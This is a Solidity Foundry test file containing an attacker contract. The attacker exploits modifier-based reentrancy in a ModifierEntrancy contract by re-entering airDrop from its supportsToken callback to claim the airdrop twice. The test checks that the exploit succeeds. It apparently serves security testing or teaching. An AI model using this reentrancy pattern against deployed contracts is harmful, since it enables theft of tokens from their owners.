
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ModifierEntrancy} from "../src/ModifierEntrancy.sol";

contract TestReentrancyModifierEntrancy is Test {
    ModifierEntrancy public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new ModifierEntrancy();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes() public {
        uint256 attackVal = 20;

        _attacker.setupAttack(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ModifierEntrancy public _victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;

    constructor(address victimAddress) { 
        _victim = ModifierEntrancy(victimAddress);
    }

    function setupAttack(uint256 val) public {
        attackCallCount = 1;
        exploitSucceeded = false;
    }

    function attack(uint256 val) public {
        initialSnapshot = _victim.tokenBalance(address(this));
        _victim.airDrop();
        
        if (_victim.tokenBalance(address(this)) > 20) {
            exploitSucceeded = true;
        }
    }

    function supportsToken() external returns(bytes32) {
        if (attackCallCount == 1) {
            attackCallCount = 2;
            _victim.airDrop();
        }
        return keccak256(abi.encodePacked("Nu Token"));
    }
}
